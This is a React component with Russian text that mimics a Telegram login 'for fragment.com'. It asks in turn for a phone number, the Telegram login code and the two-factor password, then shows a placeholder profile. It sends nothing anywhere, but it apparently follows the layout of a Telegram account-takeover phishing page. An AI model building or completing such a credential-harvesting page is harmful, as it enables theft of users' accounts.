import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import Icon from '@/components/ui/icon';

type Step = 'phone' | 'code' | '2fa' | 'profile';

const Index = () => {
  const [step, setStep] = useState<Step>('phone');
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [userName, setUserName] = useState('');

  const handlePhoneSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.length >= 10) {
      setStep('code');
    }
  };

  const handleCodeSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length === 5) {
      setStep('2fa');
    }
  };

  const handle2FASubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password.length >= 4) {
      setUserName(phone.slice(-4));
      setStep('profile');
    }
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4">
      <div className="w-full max-w-md">
        {step !== 'profile' && (
          <div className="flex flex-col items-center mb-8 animate-fade-in">
            <div className="relative mb-6">
              <div className="w-24 h-24 rounded-full bg-[#0088cc] flex items-center justify-center">
                <Icon name="Send" className="text-white" size={40} />
              </div>
            </div>
            <h1 className="text-2xl font-bold text-[#222] text-center mb-2">
              Войдите, чтобы использовать аккаунт Telegram
            </h1>
            <p className="text-base text-[#666] text-center">
              для fragment.com и fragment Auction Alerts
            </p>
          </div>
        )}

        {step === 'phone' && (
          <form onSubmit={handlePhoneSubmit} className="animate-scale-in">
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-[#222] mb-2">
                  Номер телефона
                </label>
                <Input
                  type="tel"
                  placeholder="+7 900 000 00 00"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="text-lg h-12"
                  autoFocus
                />
              </div>
              <Button
                type="submit"
                className="w-full h-12 text-base font-medium bg-[#0088cc] hover:bg-[#0077b3]"
                disabled={phone.length < 10}
              >
                Далее
              </Button>
            </div>
          </form>
        )}

        {step === 'code' && (
          <form onSubmit={handleCodeSubmit} className="animate-scale-in">
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-[#222] mb-2">
                  Код из Telegram
                </label>
                <p className="text-sm text-[#666] mb-3">
                  Мы отправили код в ваш Telegram
                </p>
                <Input
                  type="text"
                  placeholder="00000"
                  value={code}
                  onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 5))}
                  className="text-lg h-12 text-center tracking-widest"
                  maxLength={5}
                  autoFocus
                />
              </div>
              <Button
                type="submit"
                className="w-full h-12 text-base font-medium bg-[#0088cc] hover:bg-[#0077b3]"
                disabled={code.length !== 5}
              >
                Далее
              </Button>
              <Button
                type="button"
                variant="ghost"
                className="w-full"
                onClick={() => setStep('phone')}
              >
                Назад
              </Button>
            </div>
          </form>
        )}

        {step === '2fa' && (
          <form onSubmit={handle2FASubmit} className="animate-scale-in">
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-[#222] mb-2">
                  2FA пароль
                </label>
                <p className="text-sm text-[#666] mb-3">
                  Введите ваш пароль двухфакторной аутентификации
                </p>
                <Input
                  type="password"
                  placeholder="Пароль"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="text-lg h-12"
                  autoFocus
                />
              </div>
              <Button
                type="submit"
                className="w-full h-12 text-base font-medium bg-[#0088cc] hover:bg-[#0077b3]"
                disabled={password.length < 4}
              >
                Войти
              </Button>
              <Button
                type="button"
                variant="ghost"
                className="w-full"
                onClick={() => setStep('code')}
              >
                Назад
              </Button>
            </div>
          </form>
        )}

        {step === 'profile' && (
          <div className="animate-fade-in">
            <div className="text-center mb-8">
              <div className="w-32 h-32 rounded-full bg-gradient-to-br from-[#0088cc] to-[#00aaff] mx-auto mb-4 flex items-center justify-center">
                <span className="text-5xl font-bold text-white">
                  {userName.charAt(0).toUpperCase()}
                </span>
              </div>
              <h2 className="text-3xl font-bold text-[#222] mb-2">
                Добро пожаловать!
              </h2>
              <p className="text-lg text-[#666]">
                Пользователь {userName}
              </p>
            </div>

            <div className="space-y-3">
              <div className="bg-gray-50 rounded-lg p-4 flex items-center justify-between hover:bg-gray-100 transition-colors cursor-pointer">
                <div className="flex items-center gap-3">
                  <Icon name="User" className="text-[#0088cc]" size={24} />
                  <span className="font-medium text-[#222]">Профиль</span>
                </div>
                <Icon name="ChevronRight" className="text-[#999]" size={20} />
              </div>

              <div className="bg-gray-50 rounded-lg p-4 flex items-center justify-between hover:bg-gray-100 transition-colors cursor-pointer">
                <div className="flex items-center gap-3">
                  <Icon name="Bell" className="text-[#0088cc]" size={24} />
                  <span className="font-medium text-[#222]">Уведомления</span>
                </div>
                <Icon name="ChevronRight" className="text-[#999]" size={20} />
              </div>

              <div className="bg-gray-50 rounded-lg p-4 flex items-center justify-between hover:bg-gray-100 transition-colors cursor-pointer">
                <div className="flex items-center gap-3">
                  <Icon name="Settings" className="text-[#0088cc]" size={24} />
                  <span className="font-medium text-[#222]">Настройки</span>
                </div>
                <Icon name="ChevronRight" className="text-[#999]" size={20} />
              </div>

              <div className="bg-gray-50 rounded-lg p-4 flex items-center justify-between hover:bg-gray-100 transition-colors cursor-pointer">
                <div className="flex items-center gap-3">
                  <Icon name="Gavel" className="text-[#0088cc]" size={24} />
                  <span className="font-medium text-[#222]">Мои аукционы</span>
                </div>
                <Icon name="ChevronRight" className="text-[#999]" size={20} />
              </div>
            </div>

            <Button
              variant="ghost"
              className="w-full mt-8 text-red-600 hover:text-red-700 hover:bg-red-50"
              onClick={() => {
                setStep('phone');
                setPhone('');
                setCode('');
                setPassword('');
              }}
            >
              Выйти
            </Button>
          </div>
        )}
      </div>
    </div>
  );
};

export default Index;
